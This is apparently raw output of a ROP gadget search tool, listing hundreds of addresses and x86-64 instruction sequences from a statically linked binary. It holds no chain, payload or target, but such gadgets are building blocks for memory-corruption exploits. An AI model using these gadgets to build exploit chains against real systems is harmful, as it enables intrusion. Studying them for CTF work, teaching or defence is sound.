0x000000000041f9ed : outsd dx, dword ptr [rsi] ; push rdi ; ret 0xff3
0x000000000045fb9a : outsd dx, dword ptr [rsi] ; push rdi ; xor byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret
0x000000000041f952 : outsd dx, dword ptr [rsi] ; ret
0x0000000000451789 : outsd dx, dword ptr [rsi] ; ret 0x290f
0x0000000000490266 : outsd dx, dword ptr [rsi] ; ret 0x5ae4
0x000000000045418b : outsd dx, dword ptr [rsi] ; ret 0x8341
0x0000000000422007 : outsd dx, dword ptr [rsi] ; ret 0x8b4c
0x00000000004517b2 : outsd dx, dword ptr [rsi] ; ret 0xb7e8
0x00000000004541b0 : outsd dx, dword ptr [rsi] ; ret 0xb9e8
0x000000000041f9f2 : outsd dx, dword ptr [rsi] ; ret 0xc2b2
0x000000000045fbea : outsd dx, dword ptr [rsi] ; ret 0xf66
0x0000000000451750 : outsd dx, dword ptr [rsi] ; sbb ah, byte ptr [rsi + 0xf] ; outsd dx, dword ptr [rsi] ; ret
0x0000000000490265 : outsd dx, dword ptr es:[rsi] ; ret 0x5ae4
0x000000000041c542 : pcmpeqb mm0, mm1 ; lea r10, [r10 + r9] ; jmp r10
0x0000000000461094 : pcmpeqb mm3, qword ptr [rcx] ; add rax, 2 ; ret
0x000000000046107f : pcmpeqb mm3, qword ptr [rsi] ; ret
0x000000000041c541 : pcmpeqb xmm0, xmm1 ; lea r10, [r10 + r9] ; jmp r10
0x0000000000491665 : pcmpeqw mm5, qword ptr [rbp + r12*2 - 0x5f] ; mov cs, edi ; ret 0x8b36
0x0000000000491666 : pcmpeqw mm5, qword ptr [rbp - 0x5f] ; mov cs, edi ; ret 0x8b36
0x000000000043a1d6 : pextrw edi, mm0, 0x77 ; ret
0x000000000041d702 : pmovmskb eax, mm1 ; test eax, eax ; jne 0x41d769 ; xor eax, eax ; ret
0x0000000000432cef : pmovmskb edx, mm4 ; test edx, edx ; je 0x432d03 ; bsf eax, edx ; ret
0x000000000043d9d4 : pop r10 ; ret
0x0000000000491aef : pop r10 ; sub ah, ah ; mov bh, 6 ; movsd dword ptr [rdi], dword ptr [rsi] ; int1 ; ret 0x5803
0x000000000043c861 : pop r12 ; jmp rax
0x000000000043c846 : pop r12 ; mov esi, 2 ; jmp rax
0x000000000040b02e : pop r12 ; pop r13 ; jmp rax
0x0000000000414c4b : pop r12 ; pop r13 ; pop r14 ; pop r15 ; jmp rax
0x0000000000401f2d : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00000000004005ef : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000407ab9 : pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x0000000000405890 : pop r12 ; pop r13 ; pop r14 ; ret
0x000000000043ac87 : pop r12 ; pop r13 ; pop rbp ; ret
0x0000000000401d0b : pop r12 ; pop r13 ; ret
0x0000000000401489 : pop r12 ; ret
0x000000000040b030 : pop r13 ; jmp rax
0x0000000000414c4d : pop r13 ; pop r14 ; pop r15 ; jmp rax
0x0000000000401f2f : pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00000000004005f1 : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000407abb : pop r13 ; pop r14 ; pop rbp ; ret
0x0000000000405892 : pop r13 ; pop r14 ; ret
0x000000000043ac89 : pop r13 ; pop rbp ; ret
0x0000000000401d0d : pop r13 ; ret
0x0000000000414c4f : pop r14 ; pop r15 ; jmp rax
0x0000000000401f31 : pop r14 ; pop r15 ; pop rbp ; ret
0x00000000004005f3 : pop r14 ; pop r15 ; ret
0x0000000000407abd : pop r14 ; pop rbp ; ret
0x0000000000405894 : pop r14 ; ret
0x0000000000414c51 : pop r15 ; jmp rax
0x0000000000401f33 : pop r15 ; pop rbp ; ret
0x00000000004005f5 : pop r15 ; ret
0x0000000000498a94 : pop rax ; add byte ptr [r8], al ; call 0x1149853c
0x0000000000471bd6 : pop rax ; add dword ptr [rax + 0x39], ecx ; ret 0xd775
0x0000000000498269 : pop rax ; cli ; call qword ptr [rax]
0x00000000004982b9 : pop rax ; cli ; call qword ptr [rcx]
0x0000000000498281 : pop rax ; cli ; call qword ptr [rdx]
0x00000000004993f8 : pop rax ; cmc ; cli ; call rbx
0x000000000044c26d : pop rax ; idiv edi ; dec dword ptr [rax - 0x39] ; ret 0x2c20
0x000000000046d17c : pop rax ; jmp qword ptr [rax]
0x000000000049a5de : pop rax ; or cl, byte ptr [rsi] ; or byte ptr [rdi + 0xb], al ; push rsp ; ret
0x0000000000498268 : pop rax ; pop rax ; cli ; call qword ptr [rax]
0x000000000046d236 : pop rax ; pop rdx ; pop rbx ; ret
0x000000000043b97c : pop rax ; ret
0x0000000000499e68 : pop rax ; ret 0xfffb
0x000000000044ac24 : pop rax ; sti ; dec dword ptr [rbp - 0x7b] ; dec dword ptr [rax - 0x77] ; ret
0x0000000000497394 : pop rax ; xor al, 0 ; add byte ptr [rax - 0x66], ch ; stc ; call qword ptr [rax]
0x000000000049ae29 : pop rbp ; cld ; jmp qword ptr [rax]
0x000000000040afbd : pop rbp ; jmp rax
0x00000000004009fb : pop rbp ; mov edi, 0x6a2bd0 ; jmp rax
0x000000000043c860 : pop rbp ; pop r12 ; jmp rax
0x000000000043c845 : pop rbp ; pop r12 ; mov esi, 2 ; jmp rax
0x000000000040b02d : pop rbp ; pop r12 ; pop r13 ; jmp rax
0x0000000000414c4a : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; jmp rax
0x00000000004005ee : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040588f : pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000401d0a : pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000401488 : pop rbp ; pop r12 ; ret
0x0000000000414c4e : pop rbp ; pop r14 ; pop r15 ; jmp rax
0x0000000000401f30 : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret
0x00000000004005f2 : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000407abc : pop rbp ; pop r14 ; pop rbp ; ret
0x0000000000405893 : pop rbp ; pop r14 ; ret
0x000000000043ac8a : pop rbp ; pop rbp ; ret
0x000000000046f098 : pop rbp ; pop rbx ; ret
0x0000000000400a08 : pop rbp ; ret
0x0000000000497349 : pop rbp ; stc ; call qword ptr [rax]
0x000000000046fc21 : pop rbx ; add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x0000000000499a9d : pop rbx ; add byte ptr [rax], al ; and byte ptr [rcx], 0xfb ; call rsp
0x000000000048ee38 : pop rbx ; and dword ptr [rsi + rbp*2 - 0x7a], edi ; lahf ; ret 0x871e
0x000000000043a526 : pop rbx ; and eax, 0x7ff80000 ; ret
0x000000000048ee36 : pop rbx ; cmc ; pop rbx ; and dword ptr [rsi + rbp*2 - 0x7a], edi ; lahf ; ret 0x871e
0x0000000000413411 : pop rbx ; jmp 0x40f6a3
0x000000000040d484 : pop rbx ; jmp rax
0x000000000046b787 : pop rbx ; mov eax, dword ptr fs:[rax] ; ret
0x000000000043a571 : pop rbx ; mov eax, eax ; ret
0x0000000000474936 : pop rbx ; mov eax, ebp ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000045403d : pop rbx ; mov eax, edx ; pop rbp ; pop r12 ; ret
0x000000000040dc69 : pop rbx ; mov ecx, edx ; xor edx, edx ; jmp rax
0x0000000000415121 : pop rbx ; mov rax, r8 ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000456235 : pop rbx ; mov rax, r9 ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000410282 : pop rbx ; mov rax, rdi ; pop rbp ; pop r12 ; ret
0x0000000000414750 : pop rbx ; mov rax, rdx ; pop rbp ; pop r12 ; ret
0x0000000000407ab8 : pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x000000000043ac86 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x0000000000447e5c : pop rbx ; pop r12 ; ret
0x00000000004490c0 : pop rbx ; pop r14 ; ret
0x000000000040afbc : pop rbx ; pop rbp ; jmp rax
0x000000000045deb1 : pop rbx ; pop rbp ; pop r12 ; jmp rax
0x000000000043c844 : pop rbx ; pop rbp ; pop r12 ; mov esi, 2 ; jmp rax
0x000000000040b02c : pop rbx ; pop rbp ; pop r12 ; pop r13 ; jmp rax
0x000000000040588e : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000401d09 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000401487 : pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000401c86 : pop rbx ; pop rbp ; ret
0x0000000000400d38 : pop rbx ; ret
0x0000000000492120 : pop rbx ; ret 0x6f9
0x0000000000472f25 : pop rbx ; sar rax, 3 ; pop rbp ; pop r12 ; ret
0x000000000043fb60 : pop rbx ; shl eax, cl ; pop rbp ; pop r12 ; ret
0x000000000040551e : pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x000000000040dc32 : pop rbx ; xor edx, edx ; jmp rax
0x0000000000499915 : pop rcx ; add byte ptr [rax], al ; call 0x1149943b
0x0000000000499929 : pop rcx ; add byte ptr [rax], al ; in al, 0x18 ; sti ; call qword ptr [rdx]
0x00000000004998fd : pop rcx ; add byte ptr [rax], al ; loopne 0x499920 ; sti ; call qword ptr [rbx]
0x000000000046ca7f : pop rdi ; adc al, 9 ; ret 0x8b48
0x0000000000420248 : pop rdi ; adc byte ptr [rdx + 8], dh ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000499e65 : pop rdi ; add byte ptr [rax], al ; pop rax ; ret 0xfffb
0x000000000044428e : pop rdi ; add eax, dword ptr [rax] ; add bh, dh ; ret 0
0x000000000043208d : pop rdi ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000421c69 : pop rdi ; in al, dx ; mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000421a79 : pop rdi ; in eax, dx ; mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004913de : pop rdi ; insd dword ptr [rdi], dx ; test eax, 0x7d4c8c5d ; ret 0xd8f
0x0000000000414c52 : pop rdi ; jmp rax
0x00000000004903a1 : pop rdi ; mov dh, 0x4e ; ret 0x474c
0x0000000000421899 : pop rdi ; out dx, al ; mov qword ptr [rdi - 0xa], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004216c9 : pop rdi ; out dx, eax ; mov qword ptr [rdi - 9], r8 ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004217c5 : pop rdi ; out dx, eax ; mov qword ptr [rdi - 9], rcx ; mov byte ptr [rdi - 1], dl ; ret
0x0000000000421711 : pop rdi ; out dx, eax ; mov qword ptr [rdi - 9], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000401f34 : pop rdi ; pop rbp ; ret
0x00000000004005f6 : pop rdi ; ret
0x000000000049cef1 : pop rdi ; std ; jmp qword ptr [rcx]
0x000000000043ee93 : pop rdx ; add byte ptr es:[rbp - 0xcf98b40], al ; ret
0x000000000041cef6 : pop rdx ; add eax, 0x83480000 ; ret 0x4910
0x0000000000490fc1 : pop rdx ; je 0x490f8b ; ret 0xacfc
0x0000000000415d92 : pop rdx ; loopne 0x415dc2 ; add bh, dh ; ret 0
0x0000000000491f87 : pop rdx ; out 0xf5, eax ; mov ch, 0xab ; ret
0x000000000043d9d3 : pop rdx ; pop r10 ; ret
0x000000000046d237 : pop rdx ; pop rbx ; ret
0x000000000043d9f9 : pop rdx ; pop rsi ; ret
0x000000000043b9d5 : pop rdx ; ret
0x0000000000491af0 : pop rdx ; sub ah, ah ; mov bh, 6 ; movsd dword ptr [rdi], dword ptr [rsi] ; int1 ; ret 0x5803
0x0000000000431f8e : pop rsi ; add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000466cf2 : pop rsi ; movsxd rax, dword ptr [rdx] ; add byte ptr [rax + 0xf], cl ; ret 0x8b48
0x0000000000414c50 : pop rsi ; pop r15 ; jmp rax
0x0000000000401f32 : pop rsi ; pop r15 ; pop rbp ; ret
0x00000000004005f4 : pop rsi ; pop r15 ; ret
0x0000000000407abe : pop rsi ; pop rbp ; ret
0x0000000000405895 : pop rsi ; ret
0x000000000049ce55 : pop rsi ; std ; jmp qword ptr [rdx]
0x000000000042fb20 : pop rsp ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000041d1f4 : pop rsp ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000430820 : pop rsp ; add eax, 0x83480000 ; ret 0xe910
0x000000000041236d : pop rsp ; and al, 0x10 ; mov qword ptr [rsp + 8], rax ; call rsi
0x000000000043c862 : pop rsp ; jmp rax
0x000000000043c847 : pop rsp ; mov esi, 2 ; jmp rax
0x000000000040b02f : pop rsp ; pop r13 ; jmp rax
0x0000000000414c4c : pop rsp ; pop r13 ; pop r14 ; pop r15 ; jmp rax
0x0000000000401f2e : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00000000004005f0 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000407aba : pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret
0x0000000000405891 : pop rsp ; pop r13 ; pop r14 ; ret
0x000000000043ac88 : pop rsp ; pop r13 ; pop rbp ; ret
0x0000000000401d0c : pop rsp ; pop r13 ; ret
0x000000000040148a : pop rsp ; ret
0x000000000048c3ac : pop rsp ; std ; cld ; jmp rsp
0x0000000000407a64 : popfq ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000049dc3d : popfq ; add byte ptr [rax], al ; ret 0xfffd
0x000000000040249f : popfq ; and eax, 0x89480001 ; ret 0x8548
0x000000000047fba9 : popfq ; cld ; call rax
0x000000000047fba5 : popfq ; cld ; jmp qword ptr [rax]
0x000000000047fba1 : popfq ; cld ; jmp rax
0x0000000000458006 : popfq ; idiv rdi ; dec dword ptr [rax - 0x77] ; ret
0x000000000048d5bc : popfq ; mov ecx, 0xa8e0fffd ; std ; jmp qword ptr [rax]
0x000000000048d5b8 : popfq ; mov ecx, 0xb99dfffd ; std ; jmp rax
0x0000000000476a7e : popfq ; ret 0xf45
0x00000000004604f7 : popfq ; std ; dec dword ptr [rax + 0xf] ; ret 0x90c3
0x00000000004275f2 : psllq mm1, qword ptr [r15] ; jg 0x42760d ; ret
0x000000000042a112 : psllq mm1, qword ptr [r15] ; jg 0x42a12d ; ret
0x00000000004275f3 : psllq mm1, qword ptr [rdi] ; jg 0x42760c ; ret
0x000000000042a113 : psllq mm1, qword ptr [rdi] ; jg 0x42a12c ; ret
0x0000000000436606 : psllq mm1, qword ptr [rdi] ; jg 0x43661a ; mov dword ptr [rdi + 0xf], ecx ; ret
0x0000000000436605 : psllq mm1, qword ptr [rdi] ; jg 0x43661b ; mov dword ptr [rdi + 0xf], ecx ; ret
0x0000000000436667 : psllq mm1, qword ptr [rdi] ; jg 0x43667c ; mov qword ptr [rdi + 0xf], rcx ; ret
0x000000000047df6c : psubusb mm7, mm3 ; jmp rdx
0x000000000047d4d8 : push -0x3c ; cli ; call qword ptr [rax]
0x0000000000497ea4 : push -0x7ffffc1 ; cli ; jmp qword ptr [rcx]
0x0000000000436f24 : push -0x9ffffff ; ret 0x7501
0x00000000004984a5 : push -6 ; jmp qword ptr [rdx]
0x0000000000495635 : push -9 ; jmp qword ptr [rsi]
0x00000000004009ff : push 0 ; jmp rax
0x000000000040f5a4 : push 0x1002922 ; add byte ptr [rax], al ; add bl, dh ; ret
0x000000000046b769 : push 0x23 ; add byte ptr [rcx], al ; pop rbx ; ret
0x00000000004649c6 : push 0x3a058b48 ; jmp qword ptr [rbx]
0x000000000049a7c5 : push 0x3fe80000 ; cld ; jmp qword ptr [rdx]
0x0000000000409a5d : push 0x48 ; add esp, 8 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x0000000000491b62 : push 0x6e ; ja 0x491aed ; ret 0x48f
0x000000000040dcfa : push 0x75c08548 ; ret
0x000000000047d7a3 : push qword ptr [rax + 0x25] ; sti ; call qword ptr [rax]
0x000000000047d7c3 : push qword ptr [rax + 0x32] ; sti ; call qword ptr [rax]
0x000000000047d7ef : push qword ptr [rax + 0x3d] ; sti ; inc eax ; sti ; call qword ptr [rax]
0x000000000047d013 : push qword ptr [rax + 0x40fffa9e] ; sahf ; cli ; jmp rsi
0x000000000047ce03 : push qword ptr [rax + 0x40fffaaa] ; stosb byte ptr [rdi], al ; cli ; call rax
0x000000000047d2fb : push qword ptr [rax + 0x40fffad1] ; sar edx, 1 ; call rax
0x000000000045e005 : push qword ptr [rax + rcx + 0x5b] ; ret
0x000000000047d8db : push qword ptr [rax - 0x3f00046d] ; xchg eax, ebx ; sti ; call rax
0x000000000047cfdf : push qword ptr [rax - 0x5b] ; cli ; jmp rax
0x000000000047cf87 : push qword ptr [rax - 6] ; jmp rsp
0x000000000047d79b : push qword ptr [rax] ; and bh, bl ; call rax
0x000000000047d747 : push qword ptr [rax] ; idiv edx ; call rax
0x000000000047841d : push qword ptr [rax] ; jne 0x478450 ; mov rax, qword ptr [rsi + 0x10] ; ret
0x000000000047927d : push qword ptr [rax] ; jne 0x4792b0 ; mov rax, qword ptr [rsi + 0x10] ; ret
0x00000000004388a8 : push qword ptr [rbp + 0x1a] ; xor eax, eax ; ret
0x0000000000468324 : push qword ptr [rbp + 2] ; call rax
0x000000000041e2b9 : push qword ptr [rbp + 4] ; vzeroupper ; ret
0x000000000040dc9d : push qword ptr [rbp + rax - 0xa] ; ret 0x7401
0x000000000047d48f : push qword ptr [rbp + rax*8 - 6] ; jmp rsp
0x000000000046ae7b : push qword ptr [rbp - 0x2e] ; ret
0x000000000040e050 : push qword ptr [rbp - 0x44] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000043b6ec : push qword ptr [rbx + 1] ; ret
0x000000000047c90b : push qword ptr [rbx] ; xor edx, edi ; call rbx
0x0000000000457ec8 : push qword ptr [rcx] ; fcmovnb st(0), st(6) ; test eax, esi ; idiv bh ; jmp qword ptr [rax]
0x000000000044d13c : push qword ptr [rcx] ; fcmovnb st(0), st(6) ; test esp, eax ; idiv bh ; jmp qword ptr [rax]
0x0000000000463f95 : push qword ptr [rcx] ; fucomi st(0) ; ret
0x000000000040ca9f : push qword ptr [rcx] ; ror byte ptr [rax - 0x7d], 0xc4 ; sbb byte ptr [rbx + 0x5d], bl ; ret
0x000000000043bd76 : push qword ptr [rdi + 0x3f] ; ret
0x000000000043baa6 : push qword ptr [rdi + 0x57] ; ret
0x000000000043b9d3 : push qword ptr [rdi + 0x5a] ; ret
0x000000000044a732 : push qword ptr [rdi + 0xb] ; ret
0x000000000043b77a : push qword ptr [rdi + 3] ; ret
0x000000000043ba69 : push qword ptr [rdi + 4] ; ret
0x000000000043b7c8 : push qword ptr [rdi + 5] ; ret
0x0000000000461c8e : push qword ptr [rdi + 7] ; ret
0x000000000043c545 : push qword ptr [rdi + 8] ; ret
0x000000000043bb3c : push qword ptr [rdi + 9] ; ret
0x0000000000461b44 : push qword ptr [rdi + rax*2 - 0x77] ; ret 0xe283
0x000000000047d3c3 : push qword ptr [rdx + 0x42fffad0] ; sar dl, 1 ; call rdx
0x000000000047d59f : push qword ptr [rdx - 0x35] ; cli ; jmp rdx
0x000000000047ce27 : push qword ptr [rsi + 0x46fffaad] ; lodsd eax, dword ptr [rsi] ; cli ; call rsi
0x000000000047cd5f : push qword ptr [rsi + rbp*4 - 0x51bb0006] ; cli ; call rsp
0x000000000047d547 : push qword ptr [rsi - 0x3a] ; cli ; jmp rsi
0x000000000040d432 : push r8 ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x000000000045dafa : push rax ; adc byte ptr [rax - 0x77], cl ; ret
0x000000000040ea21 : push rax ; adc byte ptr [rbx - 0x2fd6efb9], cl ; ret
0x0000000000411e25 : push rax ; adc dh, dh ; ret 0xf0f
0x000000000040d433 : push rax ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x0000000000400e80 : push rax ; and byte ptr [rax + 1], cl ; ret 0xb70f
0x00000000004402a8 : push rax ; call rbx
0x000000000045d47c : push rax ; cmp byte ptr [rax + 1], cl ; ret
0x000000000045e899 : push rax ; lea r9, [rsp + 0x18] ; mov rdi, r12 ; call rbx
0x000000000047cdec : push rax ; lodsd eax, dword ptr [rsi] ; cli ; jmp rax
0x0000000000446132 : push rax ; mov rdi, qword ptr [rsp + 0x48] ; call r14
0x00000000004439e2 : push rax ; mov rdi, qword ptr [rsp + 0x48] ; call r15
0x000000000047cfdb : push rax ; movsd dword ptr [rdi], dword ptr [rsi] ; cli ; push qword ptr [rax - 0x5b] ; cli ; jmp rax
0x000000000040f982 : push rax ; or byte ptr [rax - 0x75], cl ; adc byte ptr [rcx - 0x7d], al ; ret
0x000000000040fcb5 : push rax ; or dh, dh ; ret 0x7502
0x000000000043e9c3 : push rax ; or dh, dh ; ret 0x8902
0x000000000047d737 : push rax ; out dx, al ; cli ; inc dword ptr [rax] ; int1 ; cli ; call qword ptr [rax]
0x0000000000498280 : push rax ; pop rax ; cli ; call qword ptr [rdx]
0x000000000047d788 : push rax ; sbb bl, bh ; call rax
0x000000000040ea16 : push rax ; sbb byte ptr [rbx - 0x2fd6efb9], cl ; ret
0x000000000045e0c9 : push rax ; sbb byte ptr [rcx + 0x5bc0310b], cl ; ret
0x000000000046777d : push rax ; std ; inc dword ptr [rbp + 0x5b0e78c0] ; ret
0x0000000000497740 : push rax ; sub edx, edi ; call qword ptr [rdx]
0x000000000047d8e7 : push rax ; xchg eax, ebx ; sti ; call qword ptr [rax]
0x000000000047d8c3 : push rax ; xchg eax, edx ; sti ; call qword ptr [rax]
0x000000000047d907 : push rax ; xchg eax, esp ; sti ; call qword ptr [rax]
0x000000000047454a : push rbp ; add bl, ch ; add eax, 0x1489066 ; ret 0xb70f
0x0000000000476de2 : push rbp ; add byte ptr [rax + 0x63], cl ; ret 0xbc80
0x000000000049945d : push rbp ; add byte ptr [rax], al ; sar bl, 1 ; cli ; call rsp
0x0000000000459c7c : push rbp ; and al, 0 ; mov rax, qword ptr [rax + rsi*8] ; jmp rax
0x000000000046d637 : push rbp ; and eax, dword ptr [rax] ; mov qword ptr [rax], rdx ; pop rbx ; ret
0x00000000004084bd : push rbp ; cmp byte ptr [rax + 0x39], cl ; ret
0x000000000049dafe : push rbp ; ret
0x00000000004087f6 : push rbx ; adc byte ptr [rax + 1], cl ; ret 0x2b48
0x0000000000400fcf : push rbx ; adc byte ptr [rax - 0x7d], cl ; ret
0x000000000046b41f : push rbx ; adc byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x000000000046f7d7 : push rbx ; add al, 0xf ; mov dh, 0xc0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004992e9 : push rbx ; add byte ptr [rax], al ; push rsp ; cli ; jmp rax
0x0000000000499265 : push rbx ; add byte ptr [rax], al ; sub dl, dh ; cli ; call qword ptr [rdx]
0x000000000040ad68 : push rbx ; cmp byte ptr [rax + 0x39], cl ; ret 0x2175
0x000000000040ac56 : push rbx ; cmp byte ptr [rax + 0x39], cl ; ret 0x4b74
0x0000000000439a95 : push rbx ; jb 0x439aa5 ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x000000000040ad64 : push rbx ; or byte ptr [rax + 0x2b], cl ; push rbx ; cmp byte ptr [rax + 0x39], cl ; ret 0x2175
0x0000000000447b21 : push rbx ; ret
0x0000000000490fbc : push rbx ; xchg eax, edx ; jae 0x490f9b ; push rsi ; pop rdx ; je 0x490f90 ; ret 0xacfc
0x0000000000490245 : push rcx ; call qword ptr [rsi]
0x0000000000498031 : push rcx ; cli ; call qword ptr [rdx]
0x000000000044cc06 : push rcx ; cmp byte ptr [rax + 0x39], cl ; ret
0x00000000004101f8 : push rcx ; dec dword ptr [rax - 0x7b] ; ret 0x850f
0x000000000042aa4d : push rcx ; jl 0x42aa9e ; adc dword ptr [rcx - 1], edi ; ret
0x000000000042abb4 : push rcx ; jl 0x42ac05 ; adc dword ptr [rcx + 7], edi ; ret
0x000000000043cee7 : push rcx ; or dh, dh ; ret 0x7401
0x0000000000412a70 : push rcx ; or dh, dh ; ret 0xf04
0x0000000000410bcd : push rcx ; sbb byte ptr [rcx + 1], cl ; ret 0x8d48
0x000000000043dc22 : push rdi ; adc byte ptr [rbx - 0x1e], dh ; ret
0x000000000043c8ea : push rdi ; adc byte ptr [rcx - 0x77], cl ; ret
0x0000000000436b4a : push rdi ; add al, 0x48 ; lea eax, [rdi + 5] ; ret
0x0000000000427759 : push rdi ; add al, 0x48 ; mov dword ptr [rdi], ecx ; ret
0x0000000000436bfc : push rdi ; add eax, 0xc478d48 ; ret
0x000000000044c2af : push rdi ; and byte ptr [rcx + 0x2b], cl ; push rdi ; sbb byte ptr [rax + 0x39], cl ; ret 0x850f
0x000000000043dc10 : push rdi ; and dh, al ; sub byte ptr [r9], r8b ; ret
0x0000000000421558 : push rdi ; clc ; ret
0x000000000049aca1 : push rdi ; cld ; jmp qword ptr [rbx]
0x00000000004216d0 : push rdi ; cld ; ret
0x0000000000498169 : push rdi ; cli ; call qword ptr [rcx]
0x00000000004981c9 : push rdi ; cli ; jmp qword ptr [rcx]
0x00000000004981f9 : push rdi ; cli ; jmp qword ptr [rdi]
0x00000000004221f7 : push rdi ; cli ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000427039 : push rdi ; cmc ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000045ce05 : push rdi ; cmp byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rax - 0x77] ; ret 0xf41
0x0000000000426fb9 : push rdi ; hlt ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000426e0a : push rdi ; int1 ; mov qword ptr [rdi - 8], rcx ; ret
0x000000000040d344 : push rdi ; mov qword ptr [rdi + 8], rax ; ret
0x0000000000426e9a : push rdi ; mov qword ptr [rdi - 8], rcx ; ret
0x000000000046f08a : push rdi ; or byte ptr [rcx + 0x29], cl ; ret 0x894c
0x0000000000472bda : push rdi ; or byte ptr [rcx + 1], cl ; ret 0x894c
0x000000000046f091 : push rdi ; or byte ptr [rcx - 0x2feeb728], cl ; pop rbp ; pop rbx ; ret
0x0000000000436de0 : push rdi ; or eax, 0x1c478d48 ; ret
0x00000000004649c5 : push rdi ; push 0x3a058b48 ; jmp qword ptr [rbx]
0x000000000041f94e : push rdi ; ret
0x0000000000464c79 : push rdi ; ret 0x23
0x000000000041f9ee : push rdi ; ret 0xff3
0x000000000040fa10 : push rdi ; sbb byte ptr [rax + 0x39], cl ; ret
0x000000000044c2b3 : push rdi ; sbb byte ptr [rax + 0x39], cl ; ret 0x850f
0x00000000004223f7 : push rdi ; stc ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000421c1a : push rdi ; std ; mov word ptr [rdi - 2], cx ; ret
0x0000000000421ff7 : push rdi ; sti ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000045fb9b : push rdi ; xor byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret
0x000000000041d708 : push rdi ; xor eax, eax ; ret
0x000000000043b23e : push rdx ; cld ; dec dword ptr [rax - 0x77] ; ret
0x0000000000416b4a : push rdx ; insb byte ptr [rdi], dx ; add byte ptr [rax], al ; cmove rax, rdx ; ret
0x000000000047ceb4 : push rdx ; lodsb al, byte ptr [rsi] ; cli ; jmp rdx
0x000000000047d59b : push rdx ; retf ; cli ; push qword ptr [rdx - 0x35] ; cli ; jmp rdx
0x000000000047d3ac : push rdx ; sar edx, cl ; jmp rdx
0x000000000041e634 : push rsi ; adc byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000439139 : push rsi ; add ah, byte ptr [rdx - 0xf] ; jl 0x439190 ; adc dword ptr [rsi + 3], edx ; ret
0x0000000000499585 : push rsi ; add byte ptr [rax], al ; sbb byte ptr [rax], cl ; sti ; call qword ptr [rdx]
0x00000000004279f1 : push rsi ; add cl, byte ptr [rbx + 0x257890e] ; mov dword ptr [rdi], ecx ; ret
0x0000000000427a61 : push rsi ; add dword ptr [rbx + 0x157890e], ecx ; mov dword ptr [rdi], ecx ; ret
0x0000000000436595 : push rsi ; add eax, 0x480f8948 ; mov dword ptr [rdi + 5], edx ; ret
0x0000000000427981 : push rsi ; add ecx, dword ptr [rbx + 0x357890e] ; mov dword ptr [rdi], ecx ; ret
0x0000000000436533 : push rsi ; add ecx, dword ptr [rcx + 0x357890f] ; ret
0x000000000041e649 : push rsi ; and byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000421682 : push rsi ; clc ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000421df1 : push rsi ; cld ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000421a25 : push rsi ; cld ; mov qword ptr [rdi - 0xa], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000421c05 : push rsi ; cld ; mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000421de5 : push rsi ; cld ; mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000421845 : push rsi ; cld ; mov qword ptr [rdi - 9], rcx ; mov dword ptr [rdi - 4], edx ; ret
